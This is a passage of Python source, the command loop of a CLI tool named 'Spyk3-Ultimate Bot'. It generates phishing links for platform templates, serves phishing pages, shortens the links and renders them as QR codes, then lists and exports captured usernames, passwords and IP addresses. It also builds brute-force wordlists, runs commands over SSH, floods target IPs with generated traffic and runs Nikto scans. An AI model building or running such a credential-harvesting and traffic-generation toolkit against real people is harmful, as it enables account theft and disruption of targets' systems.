    def process_command(self, command: str):
        if not command.strip():
            return
        
        self.db.update_session_activity(self.session_id)
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        # ==================== PHISHING COMMANDS ====================
        if cmd == 'help':
            self.print_help()
        
        elif cmd == 'phish_list':
            category = args[0] if args else None
            templates = self.db.get_templates(category=category)
            if not templates:
                print(f"{Colors.ORANGE1}📭 No templates found{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}📋 Available Templates:{Colors.RESET}")
            platforms = {}
            for t in templates:
                if t['platform'] not in platforms:
                    platforms[t['platform']] = []
                platforms[t['platform']].append(t['name'])
            for platform, template_list in platforms.items():
                print(f"\n{Colors.CYAN}{platform}:{Colors.RESET}")
                for t in template_list[:5]:
                    print(f"  • {t}")
                if len(template_list) > 5:
                    print(f"  ... and {len(template_list)-5} more")
        
        elif cmd == 'phish_categories':
            categories = self.db.get_categories()
            print(f"\n{Colors.BLUE1}📁 Phishing Categories:{Colors.RESET}")
            for cat in categories:
                platforms = self.db.get_platforms_by_category(cat['name'])
                print(f"\n{Colors.CYAN}{cat['name'].replace('_', ' ').title()}:{Colors.RESET}")
                print(f"  {cat['description']}")
                print(f"  Platforms: {len(platforms)}")
        
        elif cmd == 'phish_platforms':
            if not args:
                print(f"{Colors.RED}❌ Usage: phish_platforms <category>{Colors.RESET}")
                return
            platforms = self.db.get_platforms_by_category(args[0])
            if not platforms:
                print(f"{Colors.ORANGE1}📭 No platforms found for category '{args[0]}'{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}📱 Platforms in {args[0]}:{Colors.RESET}")
            for p in platforms:
                print(f"  • {p}")
        
        elif cmd == 'phish_generate':
            if not args:
                print(f"{Colors.RED}❌ Usage: phish_generate <template_name> [notes]{Colors.RESET}")
                return
            template = args[0]
            notes = ' '.join(args[1:]) if len(args) > 1 else ""
            result = self.generate_phishing_link(template, notes)
            if result['success']:
                print(f"\n{Colors.GREEN1}✅ Phishing Link Generated!{Colors.RESET}")
                print(f"{Colors.CYAN}🔗 Link ID: {result['link_id']}{Colors.RESET}")
                print(f"{Colors.CYAN}🎯 Platform: {result['platform']}{Colors.RESET}")
                print(f"{Colors.CYAN}📁 Category: {result['category']}{Colors.RESET}")
                print(f"{Colors.CYAN}🌐 URL: {result['phishing_url']}{Colors.RESET}")
                if result.get('short_url'):
                    print(f"{Colors.CYAN}🔗 Short URL: {result['short_url']}{Colors.RESET}")
                if result.get('qr_code'):
                    print(f"{Colors.CYAN}📱 QR Code: {result['qr_code']}{Colors.RESET}")
                print(f"\n{Colors.ORANGE1}💡 Next: phish_start {result['link_id']} 8080{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'phish_start':
            if not args:
                print(f"{Colors.RED}❌ Usage: phish_start <link_id> [port]{Colors.RESET}")
                return
            link_id = args[0]
            port = int(args[1]) if len(args) > 1 else 8080
            if self.start_phishing_server(link_id, port):
                status = self.phishing_server.get_url()
                print(f"\n{Colors.GREEN1}✅ Phishing server started!{Colors.RESET}")
                print(f"{Colors.CYAN}📡 URL: {status}{Colors.RESET}")
                print(f"{Colors.CYAN}🎯 Platform: {self.phishing_server.platform}{Colors.RESET}")
                print(f"{Colors.CYAN}📋 Link ID: {self.phishing_server.link_id}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to start server for link {link_id}{Colors.RESET}")
        
        elif cmd == 'phish_stop':
            self.phishing_server.stop()
        
        elif cmd == 'phish_status':
            if self.phishing_server.running:
                print(f"\n{Colors.GREEN1}✅ Phishing Server Running{Colors.RESET}")
                print(f"{Colors.CYAN}📡 URL: {self.phishing_server.get_url()}{Colors.RESET}")
                print(f"{Colors.CYAN}🎯 Platform: {self.phishing_server.platform}{Colors.RESET}")
                print(f"{Colors.CYAN}📋 Link ID: {self.phishing_server.link_id}{Colors.RESET}")
                link = self.db.get_phishing_link(self.phishing_server.link_id)
                if link:
                    print(f"{Colors.CYAN}📊 Clicks: {link.get('clicks', 0)}{Colors.RESET}")
                    print(f"{Colors.CYAN}🎯 Captures: {link.get('captures', 0)}{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE1}❌ Phishing server not running{Colors.RESET}")
        
        elif cmd == 'phish_links':
            active_only = args[0].lower() != 'all' if args else True
            links = self.db.get_phishing_links(active_only=active_only)
            if not links:
                print(f"{Colors.ORANGE1}📭 No phishing links found{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}🎣 Phishing Links ({len(links)}):{Colors.RESET}")
            for link in links[:10]:
                status = "🟢 Active" if link['active'] else "🔴 Inactive"
                print(f"\n{Colors.CYAN}ID: {link['id']}{Colors.RESET}")
                print(f"  Platform: {link['platform']} ({status})")
                print(f"  Clicks: {link['clicks']} | Captures: {link['captures']}")
                print(f"  Created: {link['created_at'][:16]}")
            if len(links) > 10:
                print(f"\n{Colors.ORANGE1}... and {len(links)-10} more links{Colors.RESET}")
        
        elif cmd == 'phish_creds':
            link_id = args[0] if args else None
            credentials = self.db.get_captured_credentials(link_id)
            if not credentials:
                print(f"{Colors.ORANGE1}📭 No captured credentials found{Colors.RESET}")
                return
            print(f"\n{Colors.RED}🎣 Captured Credentials ({len(credentials)}):{Colors.RESET}")
            for cred in credentials[:10]:
                print(f"\n{Colors.YELLOW}📧 Username: {cred.get('username', 'N/A')}{Colors.RESET}")
                print(f"  Password: {cred.get('password', 'N/A')}")
                print(f"  IP: {cred.get('ip_address', 'N/A')}")
                print(f"  Time: {cred.get('timestamp', '')[:19]}")
                print(f"  Link ID: {cred.get('link_id', 'N/A')}")
            if len(credentials) > 10:
                print(f"\n{Colors.ORANGE1}... and {len(credentials)-10} more credentials{Colors.RESET}")
        
        elif cmd == 'phish_qr':
            if not args:
                print(f"{Colors.RED}❌ Usage: phish_qr <link_id>{Colors.RESET}")
                return
            link = self.db.get_phishing_link(args[0])
            if not link:
                print(f"{Colors.RED}❌ Link ID {args[0]} not found{Colors.RESET}")
                return
            qr_path = self._generate_qr_code(args[0], link['phishing_url'])
            if qr_path:
                print(f"{Colors.GREEN1}✅ QR Code generated: {qr_path}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to generate QR code{Colors.RESET}")
        
        elif cmd == 'phish_shorten':
            if not args:
                print(f"{Colors.RED}❌ Usage: phish_shorten <link_id>{Colors.RESET}")
                return
            link = self.db.get_phishing_link(args[0])
            if not link:
                print(f"{Colors.RED}❌ Link ID {args[0]} not found{Colors.RESET}")
                return
            short_url = self._shorten_url(link['phishing_url'])
            if short_url:
                print(f"{Colors.GREEN1}✅ Short URL: {short_url}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to shorten URL{Colors.RESET}")
        
        elif cmd == 'phish_stats':
            stats = self.db.get_stats()
            print(f"\n{Colors.BLUE1}📊 Phishing Statistics:{Colors.RESET}")
            print(f"  Total Links: {stats['total_links']}")
            print(f"  Total Clicks: {stats['total_clicks']}")
            print(f"  Total Captures: {stats['total_captures']}")
            print(f"  Active Links: {stats['active_links']}")
            if stats['by_category']:
                print(f"\n{Colors.CYAN}By Category:{Colors.RESET}")
                for cat, count in stats['by_category'].items():
                    print(f"  • {cat}: {count}")
            if stats['recent_activity']:
                print(f"\n{Colors.CYAN}Recent Activity:{Colors.RESET}")
                for act in stats['recent_activity'][:5]:
                    print(f"  • {act['username']} ({act['timestamp'][:16]})")
        
        elif cmd == 'phish_export':
            format = args[0] if args else 'json'
            link_id = args[1] if len(args) > 1 else None
            if format not in ['json', 'csv', 'txt']:
                print(f"{Colors.RED}❌ Invalid format. Use json, csv, or txt{Colors.RESET}")
                return
            filepath = self.export_credentials(format, link_id)
            if filepath:
                print(f"{Colors.GREEN1}✅ Credentials exported to: {filepath}{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE1}📭 No credentials to export or export failed{Colors.RESET}")
        
        # ==================== CRUNCH COMMANDS ====================
        elif cmd == 'crunch_generate':
            if len(args) < 3:
                print(f"{Colors.RED}❌ Usage: crunch_generate <name> <min> <max> [pattern] [charset]{Colors.RESET}")
                return
            name = args[0]
            try:
                min_len = int(args[1])
                max_len = int(args[2])
            except ValueError:
                print(f"{Colors.RED}❌ Invalid length parameters{Colors.RESET}")
                return
            pattern = args[3] if len(args) > 3 else None
            charset = args[4] if len(args) > 4 else None
            print(f"{Colors.CYAN}🔐 Generating wordlist '{name}'...{Colors.RESET}")
            result = self.crunch_gen.generate_wordlist(name, min_len, max_len, pattern, charset)
            if result['success']:
                print(f"{Colors.GREEN1}✅ Wordlist generated: {result['filename']}{Colors.RESET}")
                print(f"  Size: {result['file_size']:,} bytes")
                print(f"  Lines: {result['line_count']:,}")
                print(f"  Path: {result['path']}")
            else:
                print(f"{Colors.RED}❌ Failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'crunch_list':
            wordlists = self.crunch_gen.get_wordlists()
            if not wordlists:
                print(f"{Colors.ORANGE1}📭 No wordlists found{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}🔐 Crunch Wordlists ({len(wordlists)}):{Colors.RESET}")
            for wl in wordlists[:10]:
                size_mb = wl['file_size'] / (1024 * 1024)
                print(f"\n{Colors.CYAN}ID: {wl['id']}{Colors.RESET}")
                print(f"  Name: {wl['name']}")
                print(f"  Length: {wl['min_length']}-{wl['max_length']}")
                print(f"  Lines: {wl['line_count']:,} ({size_mb:.2f} MB)")
                print(f"  Created: {wl['created_at'][:16]}")
            if len(wordlists) > 10:
                print(f"\n{Colors.ORANGE1}... and {len(wordlists)-10} more wordlists{Colors.RESET}")
        
        elif cmd == 'crunch_info':
            if not args:
                print(f"{Colors.RED}❌ Usage: crunch_info <wordlist_id>{Colors.RESET}")
                return
            wl = self.crunch_gen.get_wordlist(args[0])
            if wl:
                print(f"\n{Colors.BLUE1}📄 Wordlist Details:{Colors.RESET}")
                print(f"  ID: {wl['id']}")
                print(f"  Name: {wl['name']}")
                print(f"  Filename: {wl['filename']}")
                print(f"  Length: {wl['min_length']}-{wl['max_length']}")
                print(f"  Charset: {wl['charset'][:50]}...")
                print(f"  Pattern: {wl.get('pattern', 'N/A')}")
                print(f"  File Size: {wl['file_size']:,} bytes ({wl['file_size']/(1024*1024):.2f} MB)")
                print(f"  Line Count: {wl['line_count']:,}")
                print(f"  Created: {wl['created_at']}")
                print(f"  Status: {wl['status']}")
            else:
                print(f"{Colors.RED}❌ Wordlist {args[0]} not found{Colors.RESET}")
        
        elif cmd == 'crunch_delete':
            if not args:
                print(f"{Colors.RED}❌ Usage: crunch_delete <wordlist_id>{Colors.RESET}")
                return
            if self.crunch_gen.delete_wordlist(args[0]):
                print(f"{Colors.GREEN1}✅ Wordlist {args[0]} deleted{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to delete wordlist{Colors.RESET}")
        
        elif cmd == 'crunch_charsets':
            charsets = self.crunch_gen.get_charsets()
            print(f"\n{Colors.BLUE1}🔐 Available Character Sets:{Colors.RESET}")
            for name, charset in charsets.items():
                print(f"\n{Colors.CYAN}{name.title()}:{Colors.RESET}")
                print(f"  {charset[:50]}{'...' if len(charset) > 50 else ''}")
        
        # ==================== SSH COMMANDS ====================
        elif cmd == 'ssh_add':
            if len(args) < 3:
                print(f"{Colors.RED}❌ Usage: ssh_add <name> <host> <user> [password] [port]{Colors.RESET}")
                return
            name, host, username = args[0], args[1], args[2]
            password = args[3] if len(args) > 3 else None
            port = int(args[4]) if len(args) > 4 else 22
            notes = ' '.join(args[5:]) if len(args) > 5 else ""
            result = self.ssh_manager.add_server(name, host, username, password, None, port, notes)
            if result['success']:
                print(f"{Colors.GREEN1}✅ {result['message']}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed: {result['error']}{Colors.RESET}")
        
        elif cmd == 'ssh_list':
            servers = self.ssh_manager.get_servers()
            status = self.ssh_manager.get_status()
            if not servers:
                print(f"{Colors.ORANGE1}📭 No SSH servers configured{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}🔌 SSH Servers ({len(servers)}):{Colors.RESET}")
            for s in servers:
                conn_status = "🟢 Connected" if s.get('connected') else "🔴 Disconnected"
                print(f"\n{Colors.CYAN}ID: {s['id']}{Colors.RESET}")
                print(f"  Name: {s['name']}")
                print(f"  Host: {s['host']}:{s['port']}")
                print(f"  User: {s['username']}")
                print(f"  Status: {conn_status}")
        
        elif cmd == 'ssh_connect':
            if not args:
                print(f"{Colors.RED}❌ Usage: ssh_connect <server_id>{Colors.RESET}")
                return
            print(f"{Colors.CYAN}🔌 Connecting to server {args[0]}...{Colors.RESET}")
            result = self.ssh_manager.connect(args[0])
            if result['success']:
                print(f"{Colors.GREEN1}✅ {result['message']}{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed: {result['error']}{Colors.RESET}")
        
        elif cmd == 'ssh_exec':
            if len(args) < 2:
                print(f"{Colors.RED}❌ Usage: ssh_exec <server_id> <command>{Colors.RESET}")
                return
            server_id = args[0]
            command = ' '.join(args[1:])
            print(f"{Colors.CYAN}💻 Executing on {server_id}: {command}{Colors.RESET}")
            result = self.ssh_manager.execute_command(server_id, command)
            if result.success:
                print(f"{Colors.GREEN1}✅ Command executed ({result.execution_time:.2f}s){Colors.RESET}")
                if result.output:
                    print(f"\n{result.output[:2000]}")
            else:
                print(f"{Colors.RED}❌ Failed: {result.error}{Colors.RESET}")
        
        elif cmd == 'ssh_disconnect':
            server_id = args[0] if args else None
            self.ssh_manager.disconnect(server_id)
            print(f"{Colors.GREEN1}✅ Disconnected from {server_id if server_id else 'all servers'}{Colors.RESET}")
        
        # ==================== TRAFFIC COMMANDS ====================
        elif cmd == 'generate_traffic':
            if len(args) < 3:
                print(f"{Colors.RED}❌ Usage: generate_traffic <type> <ip> <duration> [port] [rate]{Colors.RESET}")
                print(f"  Types: {', '.join(self.traffic_gen.get_available_traffic_types()[:8])}...")
                return
            traffic_type = args[0].lower()
            target_ip = args[1]
            try:
                duration = int(args[2])
            except ValueError:
                print(f"{Colors.RED}❌ Invalid duration{Colors.RESET}")
                return
            port = int(args[3]) if len(args) > 3 else None
            rate = int(args[4]) if len(args) > 4 else 100
            try:
                generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, rate)
                print(f"{Colors.GREEN1}✅ Traffic generation started{Colors.RESET}")
                print(f"  Type: {generator.traffic_type}")
                print(f"  Target: {generator.target_ip}:{generator.target_port or 'any'}")
                print(f"  Duration: {generator.duration}s")
                print(f"  Rate: {generator.packet_rate} pps")
                print(f"  ID: {generator.id}")
            except Exception as e:
                print(f"{Colors.RED}❌ Failed: {e}{Colors.RESET}")
        
        elif cmd == 'traffic_types':
            types = self.traffic_gen.get_available_traffic_types()
            help_text = self.traffic_gen.get_traffic_types_help()
            print(f"\n{Colors.BLUE1}{help_text}{Colors.RESET}")
            print(f"Available: {len(types)} types")
        
        elif cmd == 'traffic_status':
            active = self.traffic_gen.get_active_generators()
            if not active:
                print(f"{Colors.ORANGE1}📭 No active traffic generators{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}🚀 Active Traffic Generators ({len(active)}):{Colors.RESET}")
            for gen in active:
                print(f"\n{Colors.CYAN}ID: {gen['id']}{Colors.RESET}")
                print(f"  Target: {gen['target_ip']}")
                print(f"  Type: {gen['traffic_type']}")
                print(f"  Packets: {gen['packets_sent']}")
                print(f"  Status: {gen['status']}")
        
        elif cmd == 'traffic_stop':
            gen_id = args[0] if args else None
            if self.traffic_gen.stop_generation(gen_id):
                print(f"{Colors.GREEN1}✅ Stopped {gen_id if gen_id else 'all'} traffic generators{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to stop generator{Colors.RESET}")
        
        elif cmd == 'traffic_logs':
            limit = int(args[0]) if args and args[0].isdigit() else 10
            logs = self.db.get_traffic_logs(limit)
            if not logs:
                print(f"{Colors.ORANGE1}📭 No traffic logs found{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}📊 Recent Traffic Logs ({len(logs)}):{Colors.RESET}")
            for log in logs:
                print(f"\n{Colors.CYAN}[{log['timestamp'][:19]}] {log['traffic_type']} -> {log['target_ip']}{Colors.RESET}")
                print(f"  Packets: {log['packets_sent']} | Bytes: {log['bytes_sent']}")
                print(f"  Duration: {log['duration']}s | Status: {log['status']}")
        
        elif cmd == 'traffic_help':
            print(self.traffic_gen.get_traffic_types_help())
        
        # ==================== NIKTO COMMANDS ====================
        elif cmd == 'nikto':
            if not args:
                print(f"{Colors.RED}❌ Usage: nikto <target>{Colors.RESET}")
                return
            target = args[0]
            if not self.nikto_scanner.check_availability():
                print(f"{Colors.RED}❌ Nikto is not installed{Colors.RESET}")
                return
            print(f"{Colors.CYAN}🕷️ Running Nikto scan on {target}...{Colors.RESET}")
            result = self.nikto_scanner.scan(target)
            if result['success']:
                print(f"{Colors.GREEN1}✅ Scan completed in {result['scan_time']:.2f}s{Colors.RESET}")
                if result['vulnerabilities']:
                    print(f"\n{Colors.RED}📋 Vulnerabilities Found ({len(result['vulnerabilities'])}):{Colors.RESET}")
                    for v in result['vulnerabilities'][:10]:
                        severity_color = Colors.RED if v.get('severity') == 'critical' else Colors.ORANGE1 if v.get('severity') == 'high' else Colors.YELLOW
                        print(f"  {severity_color}[{v.get('severity', 'info').upper()}]{Colors.RESET} {v.get('description', '')[:100]}")
                    if len(result['vulnerabilities']) > 10:
                        print(f"\n{Colors.ORANGE1}... and {len(result['vulnerabilities'])-10} more{Colors.RESET}")
                else:
                    print(f"{Colors.GREEN1}✅ No vulnerabilities found{Colors.RESET}")
                print(f"  Report saved to: {result['output_file']}")
            else:
                print(f"{Colors.RED}❌ Scan failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'nikto_ssl':
            if not args:
                print(f"{Colors.RED}❌ Usage: nikto_ssl <target>{Colors.RESET}")
                return
            result = self.nikto_scanner.scan(args[0], {'ssl': True})
            if result['success']:
                print(f"{Colors.GREEN1}✅ SSL/TLS scan completed{Colors.RESET}")
                print(f"  Vulnerabilities: {len(result['vulnerabilities'])}")
            else:
                print(f"{Colors.RED}❌ Failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'nikto_full':
            if not args:
                print(f"{Colors.RED}❌ Usage: nikto_full <target>{Colors.RESET}")
                return
            result = self.nikto_scanner.scan(args[0], {'timeout': 600})
            if result['success']:
                print(f"{Colors.GREEN1}✅ Full scan completed in {result['scan_time']:.2f}s{Colors.RESET}")
                print(f"  Vulnerabilities: {len(result['vulnerabilities'])}")
            else:
                print(f"{Colors.RED}❌ Failed: {result.get('error', 'Unknown error')}{Colors.RESET}")
        
        elif cmd == 'nikto_status':
            if self.nikto_scanner.check_availability():
                print(f"{Colors.GREEN1}✅ Nikto is available{Colors.RESET}")
                scans = self.db.get_nikto_scans(5)
                if scans:
                    print(f"\n{Colors.CYAN}Recent scans:{Colors.RESET}")
                    for s in scans:
                        vulns = json.loads(s.get('vulnerabilities', '[]')) if s.get('vulnerabilities') else []
                        print(f"  {s['target']} - {len(vulns)} vulns ({s['scan_time']:.1f}s)")
            else:
                print(f"{Colors.RED}❌ Nikto is not installed{Colors.RESET}")
        
        # ==================== IP MANAGEMENT COMMANDS ====================
        elif cmd == 'add_ip':
            if not args:
                print(f"{Colors.RED}❌ Usage: add_ip <ip> [notes]{Colors.RESET}")
                return
            ip = args[0]
            notes = ' '.join(args[1:]) if len(args) > 1 else "Added via command"
            try:
                ipaddress.ip_address(ip)
                if self.db.add_managed_ip(ip, "cli", notes):
                    print(f"{Colors.GREEN1}✅ IP {ip} added to monitoring{Colors.RESET}")
                else:
                    print(f"{Colors.ORANGE1}⚠️ IP {ip} already in monitoring{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}❌ Invalid IP address: {ip}{Colors.RESET}")
        
        elif cmd == 'remove_ip':
            if not args:
                print(f"{Colors.RED}❌ Usage: remove_ip <ip>{Colors.RESET}")
                return
            ip = args[0]
            if self.db.remove_managed_ip(ip):
                print(f"{Colors.GREEN1}✅ IP {ip} removed from monitoring{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ IP {ip} not found{Colors.RESET}")
        
        elif cmd == 'block_ip':
            if not args:
                print(f"{Colors.RED}❌ Usage: block_ip <ip> [reason]{Colors.RESET}")
                return
            ip = args[0]
            reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
            if self.db.block_ip(ip, reason, "cli"):
                print(f"{Colors.GREEN1}✅ IP {ip} blocked ({reason}){Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to block IP {ip}{Colors.RESET}")
        
        elif cmd == 'unblock_ip':
            if not args:
                print(f"{Colors.RED}❌ Usage: unblock_ip <ip>{Colors.RESET}")
                return
            ip = args[0]
            if self.db.unblock_ip(ip, "cli"):
                print(f"{Colors.GREEN1}✅ IP {ip} unblocked{Colors.RESET}")
            else:
                print(f"{Colors.RED}❌ Failed to unblock IP {ip}{Colors.RESET}")
        
        elif cmd == 'list_ips':
            include_blocked = not (args and args[0].lower() == 'active')
            ips = self.db.get_managed_ips(include_blocked)
            if not ips:
                print(f"{Colors.ORANGE1}📭 No managed IPs found{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}🔒 Managed IPs ({len(ips)}):{Colors.RESET}")
            for ip in ips:
                status = "🔴 Blocked" if ip.get('is_blocked') else "🟢 Active"
                print(f"\n{Colors.CYAN}{ip['ip_address']}{Colors.RESET} - {status}")
                if ip.get('notes'):
                    print(f"  Notes: {ip['notes']}")
                if ip.get('block_reason'):
                    print(f"  Reason: {ip['block_reason']}")
                print(f"  Added: {ip['added_date'][:16]}")
        
        elif cmd == 'ip_info':
            if not args:
                print(f"{Colors.RED}❌ Usage: ip_info <ip>{Colors.RESET}")
                return
            ip = args[0]
            try:
                ipaddress.ip_address(ip)
                info = self.db.get_ip_info(ip)
                threats = self.db.get_threats_by_ip(ip, 5)
                print(f"\n{Colors.BLUE1}📊 IP Information: {ip}{Colors.RESET}")
                if info:
                    print(f"  Status: {'🔴 Blocked' if info.get('is_blocked') else '🟢 Active'}")
                    print(f"  Added: {info.get('added_date', 'N/A')[:16]}")
                    if info.get('block_reason'):
                        print(f"  Block Reason: {info.get('block_reason')}")
                    if info.get('notes'):
                        print(f"  Notes: {info.get('notes')}")
                else:
                    print(f"  Not in managed IPs")
                if threats:
                    print(f"\n{Colors.RED}🚨 Recent Threats ({len(threats)}):{Colors.RESET}")
                    for t in threats[:3]:
                        print(f"  [{t['timestamp'][:16]}] {t['threat_type']} - {t['severity'].upper()}")
            except ValueError:
                print(f"{Colors.RED}❌ Invalid IP address: {ip}{Colors.RESET}")
        
        # ==================== SYSTEM COMMANDS ====================
        elif cmd == 'status':
            stats = self.db.get_statistics()
            print(f"\n{Colors.BLUE1}📊 System Status:{Colors.RESET}")
            print(f"  Session ID: {self.session_id}")
            print(f"  Phishing Links: {stats.get('active_phishing_links', 0)} active")
            print(f"  Captured Credentials: {stats.get('captured_credentials', 0)}")
            print(f"  Crunch Wordlists: {stats.get('total_crunch_wordlists', 0)}")
            print(f"  SSH Servers: {stats.get('total_ssh_servers', 0)}")
            print(f"  SSH Commands: {stats.get('total_ssh_commands', 0)}")
            print(f"  Traffic Tests: {stats.get('total_traffic_tests', 0)}")
            print(f"  Nikto Scans: {stats.get('total_nikto_scans', 0)}")
            print(f"  Managed IPs: {stats.get('total_managed_ips', 0)} ({stats.get('total_blocked_ips', 0)} blocked)")
            print(f"  Total Threats: {stats.get('total_threats', 0)}")
            print(f"\n{Colors.CYAN}Server Status:{Colors.RESET}")
            print(f"  Phishing Server: {'✅ Running' if self.phishing_server.running else '❌ Stopped'}")
            if self.phishing_server.running:
                print(f"    URL: {self.phishing_server.get_url()}")
                print(f"    Link ID: {self.phishing_server.link_id}")
        
        elif cmd == 'threats':
            limit = int(args[0]) if args and args[0].isdigit() else 10
            threats = self.db.get_recent_threats(limit)
            if not threats:
                print(f"{Colors.GREEN1}✅ No threats detected{Colors.RESET}")
                return
            print(f"\n{Colors.RED}🚨 Recent Threats ({len(threats)}):{Colors.RESET}")
            for t in threats:
                severity_color = Colors.RED if t['severity'] in ['critical', 'high'] else Colors.ORANGE1
                print(f"\n{severity_color}[{t['timestamp'][:19]}] {t['threat_type']}{Colors.RESET}")
                print(f"  Source: {t['source_ip']}")
                print(f"  Severity: {t['severity'].upper()}")
                print(f"  Description: {t['description']}")
        
        elif cmd == 'report':
            stats = self.db.get_statistics()
            threats = self.db.get_recent_threats(10)
            traffic_logs = self.db.get_traffic_logs(5)
            print(f"\n{Colors.BLUE1}📊 Security Report{Colors.RESET}")
            print(f"{Colors.BLUE2}{'='*50}{Colors.RESET}")
            print(f"\n{Colors.CYAN}📈 Statistics:{Colors.RESET}")
            print(f"  Total Phishing Links: {stats.get('total_links', 0)}")
            print(f"  Captured Credentials: {stats.get('captured_credentials', 0)}")
            print(f"  Total Threats: {stats.get('total_threats', 0)}")
            print(f"  SSH Commands: {stats.get('total_ssh_commands', 0)}")
            print(f"  Traffic Tests: {stats.get('total_traffic_tests', 0)}")
            print(f"  Crunch Wordlists: {stats.get('total_crunch_wordlists', 0)}")
            if threats:
                critical = len([t for t in threats if t['severity'] == 'critical'])
                high = len([t for t in threats if t['severity'] == 'high'])
                print(f"\n{Colors.RED}🚨 Recent Threats:{Colors.RESET}")
                print(f"  Critical: {critical}, High: {high}, Total: {len(threats)}")
            if traffic_logs:
                print(f"\n{Colors.CYAN}🚀 Recent Traffic Tests:{Colors.RESET}")
                for log in traffic_logs[:3]:
                    print(f"  {log['traffic_type']} -> {log['target_ip']} ({log['packets_sent']} packets)")
            filename = f"report_{int(time.time())}.json"
            filepath = os.path.join(REPORT_DIR, filename)
            try:
                with open(filepath, 'w') as f:
                    json.dump({'stats': stats, 'threats': threats[:20], 'timestamp': datetime.datetime.now().isoformat()}, f, indent=2)
                print(f"\n{Colors.GREEN1}✅ Report saved to: {filepath}{Colors.RESET}")
            except:
                pass
        
        elif cmd == 'history':
            limit = int(args[0]) if args and args[0].isdigit() else 20
            history = self.db.get_command_history(limit)
            if not history:
                print(f"{Colors.ORANGE1}📜 No command history{Colors.RESET}")
                return
            print(f"\n{Colors.BLUE1}📜 Command History (Last {len(history)}):{Colors.RESET}")
            for i, h in enumerate(history, 1):
                status = "✅" if h['success'] else "❌"
                print(f"  {i:2d}. {status} [{h['timestamp'][:16]}] {h['command'][:60]}")
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.ORANGE1}👋 Goodbye!{Colors.RESET}")
        
        else:
            print(f"{Colors.RED}❌ Unknown command: {cmd}{Colors.RESET}")
            print(f"{Colors.CYAN}Type 'help' for available commands{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        stats = self.db.get_stats()
        print(f"{Colors.CYAN}📊 Current Statistics:{Colors.RESET}")
        print(f"  Total Links: {stats['total_links']}")
        print(f"  Total Captures: {stats['total_captures']}")
        print(f"  Active Links: {stats['active_links']}")
        print()
        
        print(f"{Colors.GREEN1}✅ Ready! Session ID: {self.session_id}{Colors.RESET}")
        print(f"{Colors.CYAN}Type 'help' for commands{Colors.RESET}")
        
        while self.running:
            try:
                server_indicator = "🎣" if self.phishing_server.running else ""
                prompt = f"{Colors.BLUE1}[{Colors.BLUE2}{self.session_id}{Colors.BLUE1}]{Colors.CYAN}{server_indicator} 🔱> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.ORANGE1}👋 Shutting down...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.phishing_server.stop()
        self.ssh_manager.disconnect()
        self.traffic_gen.stop_generation()
        self.db.end_session(self.session_id)
        self.db.close()
        
        print(f"\n{Colors.GREEN1}✅ Shutdown complete. Goodbye!{Colors.RESET}")


# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print(f"{Colors.BLUE1}🔱 Initializing Spyk3-Ultimate Bot...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher is required{Colors.RESET}")
            sys.exit(1)
        
        app = Spyk3Ultimate()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.ORANGE1}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()